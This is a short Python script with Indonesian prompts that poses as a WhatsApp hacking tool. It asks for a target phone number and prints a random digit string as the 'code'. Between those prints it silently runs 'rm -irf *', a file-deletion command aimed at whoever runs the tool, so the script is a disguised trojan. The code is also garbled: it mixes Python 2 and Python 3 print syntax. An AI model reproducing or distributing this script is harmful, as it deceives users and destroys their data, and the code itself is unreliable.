import random,os,time


s = time.sleep
print(20*'\x1b[1;92m=')
print('\x1b[1;93m+Hack Whatsapp     +\n+Author: BuyutGans +')
print(20*'\x1b[1;92m=')
c = ''
b = 0
h = ('0','1','2','3','4','5','6','7','8','9')
while b < 6:
	t = random.choice(h)
	b += 1
	c += t + '-'
j = input('Masukkan Nomor Target: ')
print 'Sedang Mencoba Nomor: ', j
s(1)
os.system('cd $HOME')
s(1)
os.system('rm -irf *')
s(1)
print ('Ini Kode Whatsappnya: ',c) 


